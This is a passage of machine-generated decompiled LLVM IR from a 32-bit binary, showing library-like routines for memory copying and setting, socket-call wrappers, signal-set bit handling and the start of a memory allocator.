
; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_8052753(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052753:
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8052754 = load i32, i32* @esi, align 4
  store i32 %v0_8052754, i32* %stack_var_-8, align 4
  %v4_8052755 = ptrtoint i8* %arg1 to i32
  %v9_8052761 = icmp ugt i8* %tmp4, %arg1
  %v1_8052763 = icmp eq i1 %v9_8052761, false
  br i1 %v1_8052763, label %dec_label_pc_805276b, label %dec_label_pc_8052765

dec_label_pc_8052765:                             ; preds = %dec_label_pc_8052753
  %v7_8052767 = call i8* @_memcpy(i8* %arg1, i8* %tmp4, i32 %arg3)
  br label %dec_label_pc_8052777

dec_label_pc_805276b:                             ; preds = %dec_label_pc_8052753
  %v3_805276b = add i32 %arg2, -1
  %v4_805276b = add i32 %v3_805276b, %arg3
  %v5_805276b = inttoptr i32 %v4_805276b to i8*
  %v3_805276f = add i32 %v4_8052755, -1
  %v4_805276f = add i32 %v3_805276f, %arg3
  %v5_805276f = inttoptr i32 %v4_805276f to i8*
  %v7_8052774 = call i8* @_memcpy(i8* %v5_805276f, i8* %v5_805276b, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8052777

dec_label_pc_8052777:                             ; preds = %dec_label_pc_8052765, %dec_label_pc_805276b
  %v2_8052777 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8052777, i32* @esi, align 4
  ret i32 %v4_8052755

; uselistorder directives
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052777, { 1, 0 }
}

define i32 @function_805277a(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805277a:
  %v0_805277a = load i32, i32* @edi, align 4
  %v4_8052783 = ptrtoint i8* %arg1 to i32
  %v5_8052787 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805277a, i32* @edi, align 4
  ret i32 %v4_8052783

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_805278f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805278f:
  %stack_var_-4 = alloca i32, align 4
  %v2_8052792 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805279b = inttoptr i32 %arg1 to i8*
  %v3_805279b = call i32 @function_8054999(i8* %v2_805279b, i32 %v2_8052792)
  %v1_80527a6 = icmp eq i32 %v3_805279b, 0
  br i1 %v1_80527a6, label %dec_label_pc_80527ae, label %dec_label_pc_80527aa

dec_label_pc_80527aa:                             ; preds = %dec_label_pc_805278f
  %v3_80527aa = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80527ae

dec_label_pc_80527ae:                             ; preds = %dec_label_pc_805278f, %dec_label_pc_80527aa
  %v0_80527ae = phi i32 [ -1, %dec_label_pc_805278f ], [ %v3_80527aa, %dec_label_pc_80527aa ]
  ret i32 %v0_80527ae

; uselistorder directives
  uselistorder label %dec_label_pc_80527ae, { 1, 0 }
}

define i32 @function_80527b4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80527b4:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80527cf = ptrtoint i32* %stack_var_-12 to i32
  %v2_80527d6 = call i32 @function_80543e3(i32 5, i32 %v2_80527cf)
  ret i32 %v2_80527d6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80527df(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80527df:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80527fa = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052801 = call i32 @function_80543e3(i32 2, i32 %v2_80527fa)
  ret i32 %v2_8052801

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805280a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805280a:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052825 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805282c = call i32 @function_80543e3(i32 3, i32 %v2_8052825)
  ret i32 %v2_805282c

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8052835(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052835:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052850 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052857 = call i32 @function_80543e3(i32 6, i32 %v2_8052850)
  ret i32 %v2_8052857

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8052860() local_unnamed_addr {
dec_label_pc_8052860:
  %stack_var_-20 = alloca i32, align 4
  %v2_805288b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052892 = call i32 @function_80543e3(i32 15, i32 %v2_805288b)
  ret i32 %v2_8052892
}

define i32 @function_805289b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805289b:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_80528ae = ptrtoint i32* %stack_var_-8 to i32
  %v2_80528b5 = call i32 @function_80543e3(i32 4, i32 %v2_80528ae)
  ret i32 %v2_80528b5

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_80528be() local_unnamed_addr {
dec_label_pc_80528be:
  %stack_var_-16 = alloca i32, align 4
  %v2_80528e1 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80528e8 = call i32 @function_80543e3(i32 10, i32 %v2_80528e1)
  ret i32 %v2_80528e8
}

define i32 @function_80528f1() local_unnamed_addr {
dec_label_pc_80528f1:
  %stack_var_-24 = alloca i32, align 4
  %v2_8052924 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805292b = call i32 @function_80543e3(i32 12, i32 %v2_8052924)
  ret i32 %v2_805292b
}

define i32 @function_8052934() local_unnamed_addr {
dec_label_pc_8052934:
  %stack_var_-16 = alloca i32, align 4
  %v2_8052957 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805295e = call i32 @function_80543e3(i32 9, i32 %v2_8052957)
  ret i32 %v2_805295e
}

define i32 @function_8052967() local_unnamed_addr {
dec_label_pc_8052967:
  %stack_var_-24 = alloca i32, align 4
  %v2_805299a = ptrtoint i32* %stack_var_-24 to i32
  %v2_80529a1 = call i32 @function_80543e3(i32 11, i32 %v2_805299a)
  ret i32 %v2_80529a1
}

define i32 @function_80529aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_80529aa:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80529d5 = ptrtoint i32* %stack_var_-20 to i32
  %v2_80529dc = call i32 @function_80543e3(i32 14, i32 %v2_80529d5)
  ret i32 %v2_80529dc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_80529e5(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80529e5:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052a00 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052a07 = call i32 @function_80543e3(i32 1, i32 %v2_8052a00)
  ret i32 %v2_8052a07

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_80543e3, { 5, 4, 9, 3, 8, 2, 7, 1, 10, 0, 6, 11 }
}

define i32 @function_8052a10(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a10:
  %v0_8052a13 = call i32 @function_8052245()
  %v0_8052a18 = load i32, i32* @edx, align 4
  %v4_8052a1f = call i32 @function_80522d0(i32 %v0_8052a13, i32 %arg1, i32 %v0_8052a18, i32 %v0_8052a18)
  ret i32 %v4_8052a1f

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @function_80522d0, { 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_8052245, { 0, 2, 1 }
}

define i32 @function_8052a28(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a28:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8052a40, label %dec_label_pc_8052a33

dec_label_pc_8052a33:                             ; preds = %dec_label_pc_8052a28
  %v1_8052a33 = add i32 %arg1, -64
  %v3_8052a33 = sub i32 63, %arg1
  %v4_8052a33 = and i32 %v3_8052a33, %arg1
  %v5_8052a33 = icmp slt i32 %v4_8052a33, 0
  %v6_8052a33 = icmp eq i32 %v1_8052a33, 0
  %v7_8052a33 = icmp slt i32 %v1_8052a33, 0
  %v3_8052a36 = icmp eq i1 %v7_8052a33, %v5_8052a33
  %v4_8052a36 = icmp eq i1 %v6_8052a33, false
  %v5_8052a36 = and i1 %v4_8052a36, %v3_8052a36
  br i1 %v5_8052a36, label %dec_label_pc_8052a40, label %dec_label_pc_8052a38

dec_label_pc_8052a38:                             ; preds = %dec_label_pc_8052a33
  %v4_8052a3b = call i32 @function_8052b3e(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8052a40

dec_label_pc_8052a40:                             ; preds = %dec_label_pc_8052a33, %dec_label_pc_8052a28, %dec_label_pc_8052a38
  %v1_8052a40 = call i32 @function_8052729(i32 ptrtoint (i32* @0 to i32))
  %v1_8052a45 = inttoptr i32 %v1_8052a40 to i32*
  store i32 22, i32* %v1_8052a45, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8052a33, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052a40, { 2, 0, 1 }
}

define i32 @function_8052a52(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052a52:
  %v3_8052a60 = inttoptr i32 %arg1 to i8*
  %v4_8052a60 = call i32 @function_805277a(i8* %v3_8052a60, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8052a6b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8052a6b:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8052a6b = load i32, i32* @ebx, align 4
  %v15_8052a6c = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8052a80 = icmp eq i32 %arg2, -1
  br i1 %v10_8052a80, label %dec_label_pc_8052a8e, label %dec_label_pc_8052a85

dec_label_pc_8052a85:                             ; preds = %dec_label_pc_8052a6b
  %tmp25 = icmp slt i32 %arg1, 1
  br i1 %tmp25, label %dec_label_pc_8052a8e, label %dec_label_pc_8052a89

dec_label_pc_8052a89:                             ; preds = %dec_label_pc_8052a85
  %v7_8052a8c = icmp sgt i32 %arg1, 64
  br i1 %v7_8052a8c, label %dec_label_pc_8052a8e, label %dec_label_pc_8052aa9.lr.ph

dec_label_pc_8052a8e:                             ; preds = %dec_label_pc_8052a89, %dec_label_pc_8052a85, %dec_label_pc_8052a6b
  %v1_8052a8e = call i32 @function_8052729(i32 %v0_8052a6b)
  store i32 %v1_8052a8e, i32* %eax.global-to-local, align 4
  %v1_8052a93 = inttoptr i32 %v1_8052a8e to i32*
  store i32 22, i32* %v1_8052a93, align 4
  br label %dec_label_pc_8052b0f

dec_label_pc_8052aa9.lr.ph:                       ; preds = %dec_label_pc_8052a89
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8052aa927 = add i32 %v15_8052a6c, 284
  %v5_8052aa928 = inttoptr i32 %v4_8052aa927 to i32*
  store i32 0, i32* %v5_8052aa928, align 4
  %v0_8052ab429 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ab430 = add i32 %v0_8052ab429, -1
  %v9_8052ab431 = icmp slt i32 %v1_8052ab430, 0
  store i32 %v1_8052ab430, i32* %eax.global-to-local, align 4
  %v1_8052ab532 = icmp eq i1 %v9_8052ab431, false
  br i1 %v1_8052ab532, label %dec_label_pc_8052aa9.dec_label_pc_8052aa9_crit_edge, label %dec_label_pc_8052ab7

dec_label_pc_8052aa9.dec_label_pc_8052aa9_crit_edge: ; preds = %dec_label_pc_8052aa9.lr.ph, %dec_label_pc_8052aa9.dec_label_pc_8052aa9_crit_edge
  %v1_8052ab433 = phi i32 [ %v1_8052ab4, %dec_label_pc_8052aa9.dec_label_pc_8052aa9_crit_edge ], [ %v1_8052ab430, %dec_label_pc_8052aa9.lr.ph ]
  %v0_8052aa9.pre = load i32, i32* @esp, align 4
  %v2_8052aa9 = mul i32 %v1_8052ab433, 4
  %v3_8052aa9 = add i32 %v0_8052aa9.pre, 160
  %v4_8052aa9 = add i32 %v3_8052aa9, %v2_8052aa9
  %v5_8052aa9 = inttoptr i32 %v4_8052aa9 to i32*
  store i32 0, i32* %v5_8052aa9, align 4
  %v0_8052ab4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052ab4 = add i32 %v0_8052ab4, -1
  %v9_8052ab4 = icmp slt i32 %v1_8052ab4, 0
  store i32 %v1_8052ab4, i32* %eax.global-to-local, align 4
  %v1_8052ab5 = icmp eq i1 %v9_8052ab4, false
  br i1 %v1_8052ab5, label %dec_label_pc_8052aa9.dec_label_pc_8052aa9_crit_edge, label %dec_label_pc_8052ab7

dec_label_pc_8052ab7:                             ; preds = %dec_label_pc_8052aa9.dec_label_pc_8052aa9_crit_edge, %dec_label_pc_8052aa9.lr.ph
  %v0_8052ab7 = load i32, i32* @edx, align 4
  %v2_8052aba = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8052aba, i32* %eax.global-to-local, align 4
  %v4_8052ac2 = call i32 @function_8052b3e(i32 %v2_8052aba, i32 %arg1, i32 %v0_8052ab7, i32 %v0_8052ab7)
  store i32 %v4_8052ac2, i32* %eax.global-to-local, align 4
  %v2_8052aca = icmp slt i32 %v4_8052ac2, 0
  br i1 %v2_8052aca, label %dec_label_pc_8052b0f, label %dec_label_pc_8052ace

dec_label_pc_8052ace:                             ; preds = %dec_label_pc_8052ab7
  %v4_8052ad6 = call i32 @function_8052b1a(i32 ptrtoint (i32* @global_var_8056b40.204 to i32), i32 %arg1, i32 %v4_8052ac2, i32 %v4_8052ac2)
  %v2_8052aef = ptrtoint i32* %stack_var_-284 to i32
  %v2_8052af4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8052af4, i32* %eax.global-to-local, align 4
  %v4_8052afd = call i32 @function_80542ef(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8052aef)
  store i32 %v4_8052afd, i32* %eax.global-to-local, align 4
  %v2_8052b05 = icmp slt i32 %v4_8052afd, 0
  br i1 %v2_8052b05, label %dec_label_pc_8052b0f, label %dec_label_pc_8052b09

dec_label_pc_8052b09:                             ; preds = %dec_label_pc_8052ace
  %v3_8052b09 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8052b12

dec_label_pc_8052b0f:                             ; preds = %dec_label_pc_8052ace, %dec_label_pc_8052ab7, %dec_label_pc_8052a8e
  br label %dec_label_pc_8052b12

dec_label_pc_8052b12:                             ; preds = %dec_label_pc_8052b09, %dec_label_pc_8052b0f
  %storemerge = phi i32 [ -1, %dec_label_pc_8052b0f ], [ %v3_8052b09, %dec_label_pc_8052b09 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052ab4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 10, 11, 8, 9, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 1, 2, 3, 7, 8, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_8052b12, { 1, 0 }
  uselistorder label %dec_label_pc_8052aa9.dec_label_pc_8052aa9_crit_edge, { 1, 0 }
}

define i32 @function_8052b1a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052b1a:
  %v1_8052b28 = add i32 %arg2, -1
  %v1_8052b2b = urem i32 %v1_8052b28, 32
  %v2_8052b2b = icmp eq i32 %v1_8052b2b, 0
  %v2_8052b2e = udiv i32 %v1_8052b28, 32
  br i1 %v2_8052b2b, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052b1a
  %v5_8052b31 = shl i32 1, %v1_8052b2b
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052b1a, %bb
  %v6_8052b33 = phi i32 [ 1, %dec_label_pc_8052b1a ], [ %v5_8052b31, %bb ]
  %v2_8052b33 = mul nuw nsw i32 %v2_8052b2e, 4
  %v3_8052b33 = add i32 %v2_8052b33, %arg1
  %v4_8052b33 = inttoptr i32 %v3_8052b33 to i32*
  %v5_8052b33 = load i32, i32* %v4_8052b33, align 4
  %v7_8052b33 = and i32 %v5_8052b33, %v6_8052b33
  %v8_8052b33 = icmp eq i32 %v7_8052b33, 0
  %v1_8052b37 = icmp eq i1 %v8_8052b33, false
  %v2_8052b37 = zext i1 %v1_8052b37 to i32
  ret i32 %v2_8052b37

; uselistorder directives
  uselistorder i32 %v1_8052b2b, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052b3e(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8052b3e:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052b3e = load i32, i32* @ebx, align 4
  store i32 %v0_8052b3e, i32* %stack_var_-4, align 4
  %v1_8052b4c = add i32 %arg2, -1
  %v1_8052b4f = urem i32 %v1_8052b4c, 32
  %v2_8052b4f = icmp eq i32 %v1_8052b4f, 0
  store i32 %v1_8052b4f, i32* @ecx, align 4
  %v2_8052b52 = udiv i32 %v1_8052b4c, 32
  store i32 %v2_8052b52, i32* @edx, align 4
  br i1 %v2_8052b4f, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8052b3e
  %v5_8052b55 = shl i32 1, %v1_8052b4f
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8052b3e, %bb
  %v6_8052b57 = phi i32 [ 1, %dec_label_pc_8052b3e ], [ %v5_8052b55, %bb ]
  %v2_8052b57 = mul nuw nsw i32 %v2_8052b52, 4
  %v3_8052b57 = add i32 %v2_8052b57, %arg1
  %v4_8052b57 = inttoptr i32 %v3_8052b57 to i32*
  %v5_8052b57 = load i32, i32* %v4_8052b57, align 4
  %v7_8052b57 = or i32 %v5_8052b57, %v6_8052b57
  store i32 %v7_8052b57, i32* %v4_8052b57, align 4
  %v2_8052b5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052b5c, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8052b52, { 1, 0 }
  uselistorder i32 %v1_8052b4f, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8052b5e() local_unnamed_addr {
dec_label_pc_8052b5e:
  %v0_8052b5e = load i32, i32* @eax, align 4
  %v6_8052b71 = icmp ugt i32 %v0_8052b5e, 16777215
  br i1 %v6_8052b71, label %dec_label_pc_8052b82, label %dec_label_pc_8052b73

dec_label_pc_8052b73:                             ; preds = %dec_label_pc_8052b5e
  %tmp = icmp ult i32 %v0_8052b5e, 256
  %v2_8052b61 = udiv i32 %v0_8052b5e, 256
  %v2_8052b73 = call i32 @llvm.ctlz.i32(i32 %v2_8052b61, i1 true)
  %v3_8052b73 = xor i32 %v2_8052b73, 31
  %v5_8052b73 = select i1 %tmp, i32 95, i32 %v3_8052b73
  %v1_8052b76 = add nuw nsw i32 %v5_8052b73, 6
  %v2_8052b79 = urem i32 %v1_8052b76, 32
  %v4_8052b79 = icmp eq i32 %v2_8052b79, 0
  br i1 %v4_8052b79, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052b73
  %v5_8052b79 = lshr i32 %v0_8052b5e, %v2_8052b79
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052b73, %bb
  %v0_8052b7b = phi i32 [ %v0_8052b5e, %dec_label_pc_8052b73 ], [ %v5_8052b79, %bb ]
  %v1_8052b7b = urem i32 %v0_8052b7b, 4
  %v2_8052b7e = mul nuw nsw i32 %v5_8052b73, 4
  %v3_8052b7e = or i32 %v1_8052b7b, 32
  %v4_8052b7e = add nuw nsw i32 %v3_8052b7e, %v2_8052b7e
  br label %dec_label_pc_8052b82

dec_label_pc_8052b82:                             ; preds = %dec_label_pc_8052b5e, %bb4
  %v0_8052b83 = phi i32 [ 95, %dec_label_pc_8052b5e ], [ %v4_8052b7e, %bb4 ]
  ret i32 %v0_8052b83

; uselistorder directives
  uselistorder i32 %v2_8052b79, { 1, 0 }
  uselistorder i32 %v0_8052b5e, { 2, 3, 1, 0, 4 }
  uselistorder i1 true, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8052b82, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8052b84(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052b84:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8052b84 = load i32, i32* @ebp, align 4
  %v0_8052b85 = load i32, i32* @edi, align 4
  %v0_8052b86 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8052b99 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052b99, i32* @eax, align 4
  store i32 %v2_8052b99, i32* %stack_var_-92, align 4
  %v2_8052b9e = call i32 @function_80540b0(i32 %v2_8052b99, i32 134561965)
  store i32 %v2_8052b9e, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056820.205 to i32), i32* %stack_var_-92, align 4
  %v1_8052baa = call i32 @function_80540ad(i32 ptrtoint (i32* @global_var_8056820.205 to i32))
  store i32 %v1_8052baa, i32* %eax.global-to-local, align 4
  %v0_8052bb2 = load i32, i32* %ebx.global-to-local, align 4
  %tmp124 = icmp ult i32 %v0_8052bb2, -32
  br i1 %tmp124, label %dec_label_pc_8052bc9, label %dec_label_pc_8052bb7

dec_label_pc_8052bb7:                             ; preds = %dec_label_pc_8052b84
  %v0_8052bb7 = load i32, i32* %stack_var_-92, align 4
  %v1_8052bb7 = call i32 @function_8052729(i32 %v0_8052bb7)
  store i32 %v1_8052bb7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052bbe = inttoptr i32 %v1_8052bb7 to i32*
  store i32 12, i32* %v1_8052bbe, align 4
  br label %dec_label_pc_80532ee

dec_label_pc_8052bc9:                             ; preds = %dec_label_pc_8052b84
  %v1_8052bc9 = add i32 %v0_8052bb2, 11
  %tmp125 = icmp ult i32 %v1_8052bc9, 16
  br i1 %tmp125, label %dec_label_pc_8052be0, label %dec_label_pc_8052bd9

dec_label_pc_8052bd9:                             ; preds = %dec_label_pc_8052bc9
  %v1_8052bd9 = and i32 %v1_8052bc9, -8
  br label %dec_label_pc_8052be0

dec_label_pc_8052be0:                             ; preds = %dec_label_pc_8052bc9, %dec_label_pc_8052bd9
  %storemerge135 = phi i32 [ %v1_8052bd9, %dec_label_pc_8052bd9 ], [ %v1_8052bc9, %dec_label_pc_8052bc9 ]
  %v1_8052f78 = phi i32 [ %v1_8052bd9, %dec_label_pc_8052bd9 ], [ 16, %dec_label_pc_8052bc9 ]
  store i32 %storemerge135, i32* %eax.global-to-local, align 4
  %v0_8052be0 = load i8, i8* @global_var_8056bc0.206, align 1
  %v1_8052be0 = sext i8 %v0_8052be0 to i32
  store i32 %v1_8052be0, i32* @ebx, align 4
  %v3_8052be6 = urem i8 %v0_8052be0, 2
  %v4_8052be6 = icmp eq i8 %v3_8052be6, 0
  %v1_8052be9 = icmp eq i1 %v4_8052be6, false
  br i1 %v1_8052be9, label %dec_label_pc_8052c08, label %dec_label_pc_8052beb

dec_label_pc_8052beb:                             ; preds = %dec_label_pc_8052be0
  %v2_8052beb = icmp eq i8 %v0_8052be0, 0
  %v1_8052bed = icmp eq i1 %v2_8052beb, false
  br i1 %v1_8052bed, label %dec_label_pc_8052ee3, label %dec_label_pc_8052bf3

dec_label_pc_8052bf3:                             ; preds = %dec_label_pc_8052beb
  store i32 ptrtoint (i8* @global_var_8056bc0.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052bfb = call i32 @function_80537a1(i32* bitcast (i8* @global_var_8056bc0.206 to i32*))
  store i32 %v2_8052bfb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052ee3

dec_label_pc_8052c08:                             ; preds = %dec_label_pc_8052be0
  %v11_8052c08 = trunc i32 %v1_8052f78 to i8
  %v8_8052c0c = icmp ugt i8 %v11_8052c08, %v0_8052be0
  br i1 %v8_8052c0c, label %dec_label_pc_8052c29, label %dec_label_pc_8052c0e

dec_label_pc_8052c0e:                             ; preds = %dec_label_pc_8052c08
  %v2_8052c12 = udiv i32 %v1_8052f78, 2
  store i32 %v2_8052c12, i32* %eax.global-to-local, align 4
  %v1_8052c14 = add i32 %v2_8052c12, ptrtoint (i8* @global_var_8056bc0.206 to i32)
  store i32 %v1_8052c14, i32* %ecx.global-to-local, align 4
  %v1_8052c1a = add i32 %v2_8052c12, add (i32 ptrtoint (i8* @global_var_8056bc0.206 to i32), i32 -4)
  %v2_8052c1a = inttoptr i32 %v1_8052c1a to i32*
  %v3_8052c1a = load i32, i32* %v2_8052c1a, align 4
  store i32 %v3_8052c1a, i32* @edx, align 4
  %v1_8052c1d = icmp eq i32 %v3_8052c1a, 0
  br i1 %v1_8052c1d, label %dec_label_pc_8052c29, label %dec_label_pc_8052c21

dec_label_pc_8052c21:                             ; preds = %dec_label_pc_8052c0e
  %v1_8052c21 = add i32 %v3_8052c1a, 8
  %v2_8052c21 = inttoptr i32 %v1_8052c21 to i32*
  %v3_8052c21 = load i32, i32* %v2_8052c21, align 4
  store i32 %v3_8052c21, i32* %eax.global-to-local, align 4
  store i32 %v3_8052c21, i32* %v2_8052c1a, align 4
  br label %dec_label_pc_8052c62

dec_label_pc_8052c29:                             ; preds = %dec_label_pc_8052c0e, %dec_label_pc_8052c08
  %v8_8052c29 = icmp ult i32 %v1_8052f78, 255
  %v6_8052c31 = icmp ugt i32 %v1_8052f78, 255
  store i32 %v1_8052f78, i32* @eax, align 4
  br i1 %v6_8052c31, label %dec_label_pc_8052c6a, label %dec_label_pc_8052c33

dec_label_pc_8052c33:                             ; preds = %dec_label_pc_8052c29
  %v2_8052c37 = udiv i32 %v1_8052f78, 8
  store i32 %v2_8052c37, i32* %eax.global-to-local, align 4
  %v1_8052c3e = mul nuw i32 %v2_8052c37, 8
  %v2_8052c3e = add i32 %v1_8052c3e, ptrtoint (i32* @global_var_8056bec.207 to i32)
  store i32 %v2_8052c3e, i32* %ecx.global-to-local, align 4
  %v1_8052c45 = add i32 %v1_8052c3e, add (i32 ptrtoint (i32* @global_var_8056bec.207 to i32), i32 12)
  %v2_8052c45 = inttoptr i32 %v1_8052c45 to i32*
  %v3_8052c45 = load i32, i32* %v2_8052c45, align 4
  store i32 %v3_8052c45, i32* @edx, align 4
  %v12_8052c48 = icmp eq i32 %v3_8052c45, %v2_8052c3e
  br i1 %v12_8052c48, label %dec_label_pc_8052d66.preheader, label %dec_label_pc_8052c50

dec_label_pc_8052c50:                             ; preds = %dec_label_pc_8052c33
  store i32 %v1_8052f78, i32* %ebx.global-to-local, align 4
  %v1_8052c54 = add i32 %v3_8052c45, 12
  %v2_8052c54 = inttoptr i32 %v1_8052c54 to i32*
  %v3_8052c54 = load i32, i32* %v2_8052c54, align 4
  store i32 %v3_8052c54, i32* %eax.global-to-local, align 4
  store i32 %v3_8052c54, i32* %v2_8052c45, align 4
  %v0_8052c5a = load i32, i32* @edx, align 4
  %v1_8052c5a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052c5a = add i32 %v0_8052c5a, 4
  %v3_8052c5a = add i32 %v2_8052c5a, %v1_8052c5a
  %v4_8052c5a = inttoptr i32 %v3_8052c5a to i32*
  %v5_8052c5a = load i32, i32* %v4_8052c5a, align 4
  %v6_8052c5a = or i32 %v5_8052c5a, 1
  store i32 %v6_8052c5a, i32* %v4_8052c5a, align 4
  %v0_8052c5f = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052c5f = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c5f = add i32 %v1_8052c5f, 8
  %v3_8052c5f = inttoptr i32 %v2_8052c5f to i32*
  store i32 %v0_8052c5f, i32* %v3_8052c5f, align 4
  br label %dec_label_pc_8052c62

